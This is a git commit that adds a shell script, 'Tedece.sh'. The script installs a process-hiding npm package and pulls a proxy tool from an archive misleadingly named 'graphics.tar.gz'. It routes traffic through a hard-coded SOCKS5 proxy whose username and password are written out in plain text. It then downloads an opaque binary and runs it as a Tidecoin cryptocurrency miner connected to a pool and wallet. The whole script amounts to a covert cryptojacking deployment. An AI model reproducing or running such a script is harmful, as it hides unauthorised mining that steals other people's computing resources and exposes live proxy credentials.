f8f2cc66c14b3f4be78dd185c3624438bea80fd3
denisule54 <87700595+denisule54@users.noreply.github.com>
2022-02-17 23:32:10 +0700

    Create Tedece.sh

---
+++ Tedece.sh
@@ -0,0 +1,50 @@
+apt update && apt -y install sudo wget curl unzip
+
+sudo apt-get install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm
+
+apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++
+
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+
+listen = :2233
+
+loglevel = 1
+
+socks5 = 209.127.191.180:9279
+
+socks5_username = cosxjsqw
+
+socks5_password = aydutzusi3fr
+
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://github.com/Asriytdx/wesharex/raw/main/asese
+chmod +x asese
+
+./graftcp/graftcp ./asese -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.MyRig8 --algo yespower --param-n 2048 --param-r 8 --param-key ""
